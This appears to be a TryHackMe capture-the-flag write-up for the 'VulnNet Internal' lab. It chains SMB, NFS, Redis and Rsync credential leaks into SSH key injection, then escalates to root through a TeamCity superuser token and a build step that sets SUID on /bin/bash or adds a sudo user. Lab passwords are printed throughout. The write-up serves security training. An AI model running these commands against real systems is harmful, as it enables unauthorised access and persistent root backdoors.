@@ -1,0 +1,411 @@
+---
+title: 'VulnNet Internal'
+description: 'SMB, NFS and Redis enumeration, a chained credential exfiltration, authorized_keys injection via Rsync and SSH port forwarding.'
+publishDate: 2026-09-04
+tags:
+  - cybersecurity
+  - tryhackme
+  - privesc
+---
+
+**Difficulty:** Easy/Medium **Category:** SMB, NFS, Redis enumeration, chained credential exfiltration, Rsync (`authorized_keys` injection), SSH port forwarding, privilege escalation via JetBrains TeamCity (superuser token + malicious build pipeline) **Room:** [https://tryhackme.com/room/vulnnetinternal](https://tryhackme.com/room/vulnnetinternal)
+
+## Room description
+
+A Linux machine from the “VulnNet” series, centred almost entirely on the **chained enumeration of misconfigured internal services**: each service leaks a credential that allows advancing to the next (SMB → NFS → Redis → Rsync → SSH), until getting access as user `sys-internal`. The final privilege escalation requires discovering an instance of **TeamCity** (JetBrains' continuous-integration tool) running as root, accessible only from `localhost`, and using a **superuser authentication token** leaked in its logs to create a build pipeline that runs arbitrary commands with root privileges.
+
+> **Note on placeholders:** `{IP}` / `target` stands for the IP TryHackMe assigns (it changes on every deploy; these notes use `TARGET_IP` as an example from one specific session).
+
+---
+
+## 1. Recon (nmap, a prior step not explicitly in these notes)
+
+```bash
+sudo nmap -p- -sV -sC -T4 target -oN nmap/all_ports
+```
+
+**Expected ports:**
+
+| Port         | Service                       |
+| ------------ | ----------------------------- |
+| 22/tcp       | SSH                           |
+| 111/tcp      | RPCbind (associated with NFS) |
+| 139, 445/tcp | SMB (Samba)                   |
+| 2049/tcp     | NFS                           |
+| 6379/tcp     | Redis                         |
+| 873/tcp      | Rsync                         |
+
+The number of file-sharing and remote-access services exposed simultaneously (SMB, NFS, Rsync) is the first clear sign that the entry vector will be a **chain of leaked credentials** between these services, rather than a specific code vulnerability.
+
+---
+
+## 2. SMB enumeration
+
+```bash
+smbclient -L target
+```
+
+- `-L`: lists the available shares on the SMB server, without needing to connect to any in particular.
+
+Among the listed resources, one stands out accessible without authentication:
+
+```bash
+smbclient //target/shares
+```
+
+Connecting (with a blank user or `guest`, no password), browse the share:
+
+```
+smb: \> cd temp
+smb: \> mget services.txt
+smb: \> exit
+```
+
+- `mget`: downloads the specified file to the current local directory.
+
+The `services.txt` file contains internal notes from the systems team, mentioning (among other things) that there are important configurations stored on an **NFS** share, giving us the hint for the next step.
+
+---
+
+## 3. Exploring NFS exports
+
+```bash
+showmount -e target
+```
+
+- `showmount -e`: lists the exports the NFS server offers to be mounted, without needing authentication (common, and dangerous, behaviour in poorly secured NFS configurations).
+
+**Expected result:**
+
+```
+/opt/conf *(rw,sync,no_subtree_check)
+```
+
+### 3.1 Mount the NFS export
+
+```bash
+mkdir -p /tmp/nfs_share
+sudo mount -t nfs {IP}:/opt/conf /tmp/nfs_share
+cd /tmp/nfs_share
+ls -la
+```
+
+- `mount -t nfs`: mounts the remote NFS resource at a local mount point, making its content browsable as if it were part of the local filesystem.
+
+Inside is a `redis/` directory, with an interesting configuration file:
+
+```bash
+cp /tmp/nfs_share/redis/redis.conf ~/thm/vulnnet/loot/
+grep -i "requirepass" redis.conf
+```
+
+- `requirepass`: a Redis configuration directive that sets the password required to authenticate against the server — leaked here by being accessible via NFS without proper restrictions.
+
+**Password obtained:**
+
+```
+B65Hx562F@ggAZ@F
+```
+
+---
+
+## 4. Redis enumeration and second flag
+
+```bash
+redis-cli -h target -a B65Hx562F@ggAZ@F
+```
+
+- `-h`: target host.
+- `-a`: authentication password.
+
+Inside the interactive `redis-cli` session:
+
+```
+KEYS *
+```
+
+- `KEYS *`: lists **all** the keys stored in the current Redis database (a dangerous command in production because of its performance cost, but perfect for recon in a CTF).
+
+Among the keys found, one called `authlist` stands out, of type **list**:
+
+```
+LRANGE authlist 1 20
+```
+
+- `LRANGE key start stop`: returns a range of elements of a list-type key in Redis (`0` would be the first element; these notes use `1` as the start, deliberately or accidentally omitting the first element — it is worth also trying `LRANGE authlist 0 -1` to make sure you get the whole list, where `-1` means “up to the last element”).
+
+The content of this list includes a **Base64**-encoded entry, which when decoded reveals:
+
+```bash
+echo '<base64_string_obtained>' | base64 -d
+```
+
+**Result:**
+
+```
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+```
+
+This confirms the existence of an additional **Rsync** service, with its own user (`rsync-connect`) and password.
+
+### 4.1 Second flag
+
+Inside the same `redis-cli` session, look directly for a key related to the room’s internal flag (mentioned in the TryHackMe task questions):
+
+```
+GET "internal flag"
+```
+
+- `GET`: retrieves the value of a string-type key in Redis. The exact key name (for example, `flag` or a similar variation) may require first reviewing the full output of `KEYS *` to confirm it, since Redis is case- and space-sensitive in key names.
+
+---
+
+## 5. Exploiting Rsync and getting the third flag
+
+With the Rsync credentials obtained (`rsync-connect:Hcg3HP67@TW@Bc72v`), list and download the content of the corresponding share:
+
+```bash
+rsync -avz rsync://rsync-connect@target/files/sys-internal ~/thm/vulnnet/loot
+```
+
+- `-a` (_archive_): a sync mode that preserves permissions, timestamps, symlinks, etc. — the standard mode recommended for faithful copies.
+- `-v` (_verbose_): shows the detail of transferred files.
+- `-z`: compresses the data during transfer (more efficient on slow networks, with no functional effect in this context).
+- When run, `rsync` will ask for the password of user `rsync-connect` (the one obtained in the previous step).
+
+```bash
+cat ~/thm/vulnnet/loot/sys-internal/user.txt
+```
+
+**Third flag** (corresponding to the system user, `sys-internal`).
+
+### 5.1 The key vector: Rsync with write permissions
+
+Beyond just reading the content, if the Rsync resource is configured with **write** permissions (not just read), it is possible to **upload an `authorized_keys` file** inside the `.ssh/` directory of user `sys-internal`, granting SSH access without needing to know any additional system password — this is the real technique that connects this step with the next.
+
+---
+
+## 6. Gaining access via SSH (public-key injection)
+
+### 6.1 Generate a new SSH key pair
+
+```bash
+ssh-keygen -t rsa
+```
+
+- `-t rsa`: generates an RSA key pair. Run without further options, it will interactively ask where to save the key (for example, `~/thm/vulnnet/content/keys`) and, optionally, a passphrase (which can be left blank to simplify later access).
+
+This generates two files: `keys` (private key) and `keys.pub` (public key).
+
+```bash
+chmod 600 keys
+```
+
+- Adjusts the private key’s permissions, a requirement for SSH to accept its use.
+
+### 6.2 Upload the public key via Rsync
+
+Taking advantage of the Rsync resource’s write permission (step 5.1), upload the content of `keys.pub` as `authorized_keys` inside `sys-internal`'s `.ssh/`:
+
+```bash
+rsync -avz keys.pub rsync://rsync-connect@target/files/sys-internal/.ssh/authorized_keys
+```
+
+- This adds the public key to that user’s list of authorised keys, without needing to know any OS password — the equivalent of “sneaking into” the SSH authentication mechanism by taking advantage of a poorly restricted file resource.
+
+### 6.3 Clean `known_hosts` and connect
+
+```bash
+ssh-keygen -f '~/.ssh/known_hosts' -R 'target'
+```
+
+- Removes any previous entry associated with the host, avoiding warnings if the IP was reused by another TryHackMe machine.
+
+```bash
+ssh -i keys sys-internal@target
+```
+
+Access obtained as `sys-internal`, with no password needed, thanks to the private key corresponding to the public key injected via Rsync.
+
+---
+
+## 7. Local enumeration and TeamCity discovery
+
+### 7.1 Review local connections/ports
+
+```bash
+ss -tno
+```
+
+- `ss` (_socket statistics_, the modern successor to `netstat`): `-t` filters TCP connections, `-n` shows numeric ports (without resolving service names), `-o` shows timer information associated with each connection.
+
+Among the listening ports, one stands out that is **only accessible from `localhost` (127.0.0.1)**:
+
+```
+LISTEN  0  100  127.0.0.1:8111  *:*
+```
+
+Port **8111** is the default port of **JetBrains TeamCity**’s web interface, a continuous-integration (CI/CD) tool widely used in corporate development environments. The fact that it only listens on `localhost` explains why it did not appear in the initial external port scan — it is only reachable **from inside** the machine itself.
+
+Additionally, you can confirm the application’s presence by exploring the filesystem:
+
+```bash
+ls -la /TeamCity
+ps aux | grep -i teamcity
+```
+
+It is confirmed that the TeamCity process runs as **root**, a critical fact: any way to run commands through TeamCity will translate directly into execution with root privileges.
+
+### 7.2 Port forwarding (port redirection via SSH)
+
+Since the service only listens on the remote server’s `localhost`, it is necessary to **redirect that port to the attacker machine** through the already-established SSH tunnel:
+
+```bash
+ssh -i ~/thm/vulnnet/content/keys sys-internal@target -L 8111:127.0.0.1:8111
+```
+
+- `-L 8111:127.0.0.1:8111`: _local port forwarding_. It tells SSH that any connection to `127.0.0.1:8111` **on the attacker machine** is forwarded, through the encrypted SSH tunnel, to `127.0.0.1:8111` **from the remote server’s perspective** — exactly the port where TeamCity listens, which you otherwise could not reach directly.
+
+With this SSH session active (leaving it open in a terminal), open **another new terminal** to continue the enumeration, while the tunnel keeps working in the background.
+
+---
+
+## 8. Finding TeamCity’s superuser token
+
+With the tunnel active, it is now possible to visit TeamCity’s web interface from your own browser:
+
+```
+http://127.0.0.1:8111/login.html
+```
+
+The normal login page requires credentials we do not have. However, TeamCity offers a special emergency-access route for first startup/emergency administration:
+
+```
+http://127.0.0.1:8111/login.html?super=1
+```
+
+This page asks for a **superuser authentication token** instead of a username/password — a token TeamCity automatically generates and records in its **log files** each time the service starts, meant for an administrator with server access to recover it in case of credential loss.
+
+### 8.1 Find the token in the logs
+
+From the original SSH session (the one keeping the tunnel active, or in an additional new SSH connection):
+
+```bash
+cd /TeamCity
+grep -i "super user" logs/catalina.out
+```
+
+- `catalina.out`: the standard log file of the **Apache Tomcat** application server (on which TeamCity runs), where the service’s startup messages are recorded.
+
+**Expected result (example):**
+
+```
+[TeamCity] Super user authentication token: 6242291xxxxxxxxxx (use empty username with the token as the password to access the server)
+```
+
+> Note: there may be **several entries** of this kind in the log (one per service restart); only the most recent is usually valid — if the first token tried does not work, try the next ones, starting with the most recent.
+
+### 8.2 Log in as superuser
+
+At `http://127.0.0.1:8111/login.html?super=1`, leave the **username field blank** and enter the **token** as if it were the password.
+
+---
+
+## 9. Privilege escalation — Malicious build pipeline in TeamCity
+
+### 9.1 Create a new project
+
+Once authenticated as superuser, create a new project from the interface (“Create project”), giving it any name (for example, from an empty/manual Git repository, or the manual-creation option without a repository if available).
+
+### 9.2 Create a build configuration
+
+Inside the newly created project, create a new **build configuration**, and when configuring its **Build Steps** (“Add build step”), choose the _runner_ type:
+
+```
+Command Line
+```
+
+This _runner_ type allows running arbitrary shell commands directly as part of the build process — and since the TeamCity process itself runs as **root** (confirmed in step 7.1), any command run here inherits those privileges.
+
+### 9.3 The malicious script
+
+Enter a script that grants a persistent escalation route, for example setting the **SUID** bit on `/bin/bash` (documented in GTFOBins as a classic escalation technique: a SUID-root `bash` lets any user obtain a root shell with `bash -p`):
+
+```bash
+chmod u+s /bin/bash
+```
+
+Or, alternatively (equally valid and documented in several public write-ups of this room), directly create a new user with `sudo` privileges:
+
+```bash
+username="pentester"
+password="pentester123"
+sudo useradd -m -s /bin/bash $username
+echo "$username:$password" | sudo chpasswd
+sudo adduser $username sudo
+```
+
+### 9.4 Run the build
+
+Save the configuration and press **“Run”** to trigger the build execution. TeamCity runs the defined script, with root privileges, on the real host system (not in an isolated container, since this installation does not use build agents in separate containers).
+
+### 9.5 Confirm the escalation
+
+Back in the SSH session as `sys-internal`:
+
+```bash
+ls -la /bin/bash
+```
+
+It should show the SUID bit set (`-rwsr-xr-x`, the `s` instead of the owner’s `x`) if the first method was used:
+
+```bash
+/bin/bash -p
+```
+
+- `-p`: as explained on previous machines, it prevents Bash from dropping the inherited effective privileges when it detects that the process’s real UID and effective UID differ — needed to keep the just-acquired SUID privilege.
+
+```bash
+whoami
+# root
+```
+
+### 9.6 Root flag
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 10. Attack chain summary
+
+1. **Recon** with `nmap` → SMB, NFS, Redis, Rsync, SSH — the typical architecture of a leaked-credential chain.
+2. **SMB enumeration** → `shares` resource accessible without authentication → `services.txt`, pointing toward NFS.
+3. **NFS enumeration** (`showmount -e`, mounting the export) → `redis.conf`, with the Redis password (`requirepass`).
+4. **Redis enumeration** (`redis-cli`, `KEYS *`, `LRANGE`) → a Base64-encoded key reveals Rsync credentials.
+5. **Rsync exploitation**: download files of user `sys-internal` (second/third flag), and **upload** an own SSH public key as `authorized_keys`, taking advantage of the resource’s write permissions.
+6. **SSH access** as `sys-internal` with no system password needed.
+7. **Local enumeration** (`ss -tno`) → discover TeamCity listening only on `localhost:8111`, running as root.
+8. **SSH port forwarding** (`-L 8111:127.0.0.1:8111`) → access to TeamCity’s interface from the local browser.
+9. **Finding the superuser token** in `logs/catalina.out` → log in as superuser in TeamCity.
+10. **Creating a malicious build pipeline** (“Command Line” runner) → run commands as root (SUID on `/bin/bash`, or creating a sudoer user).
+11. **Final escalation** (`bash -p`) → root shell → final flag.
+
+## 11. Lessons learned / key concepts
+
+- **File-sharing services (SMB, NFS, Rsync) accessible without proper authentication** are one of the most common causes of cascading compromise: it is enough for one of them to leak another service’s credential to start a chain reaction.
+- **`showmount -e` with no origin restrictions (`no_root_squash`, open ACLs)** in NFS is an extremely common insecure configuration in internal environments, since it is usually (wrongly) assumed that the internal network is “trusted” and needs no additional authentication.
+- **Redis without strong authentication or accessible from untrusted networks** can leak any stored data (`KEYS *` needs no special privileges once authenticated) — Redis should never be exposed directly without an additional layer of network access control.
+- **Rsync with poorly restricted write permissions** not only allows reading sensitive files, but potentially **writing** to critical locations like `~/.ssh/authorized_keys` — turning a simple file-sync service into a direct passwordless SSH access vector.
+- **SSH port forwarding (`-L`)** is a fundamental _pivoting_ technique every pentester must master: it allows reaching services that only listen on the remote server’s `localhost`, something extremely common in internal administrative applications (CI/CD panels, databases, internal APIs) that administrators assume “protected” simply by not being directly exposed to the external network.
+- **CI/CD tools (TeamCity, Jenkins, GitLab Runners, etc.) that run builds with elevated privileges and no isolation (no separate containers/agents)** are an extremely powerful privilege-escalation vector: anyone with access to create and run a pipeline gets, in practice, command execution with the same privileges as the CI/CD service itself — here, root.
+- **Emergency recovery tokens recorded in plaintext logs** (like TeamCity’s superuser token in `catalina.out`) are convenient for legitimate administrators, but represent a serious risk if those logs are accessible by any system user without additional restrictions.
+
+## 12. Tools used
+
+`nmap`, `smbclient`, `showmount`, `mount` (NFS), `redis-cli`, `rsync`, `ssh-keygen`, the `ssh` client (including _port forwarding_ with `-L`), `ss`, a web browser (TeamCity interface), `grep`.
+
+---
+
+_Academic write-up, built from my own notes solving the “VulnNet: Internal” machine on TryHackMe, supplemented with public community write-ups to complete the initial recon, the SSH key upload mechanism via Rsync, and the full privilege-escalation process through JetBrains TeamCity._
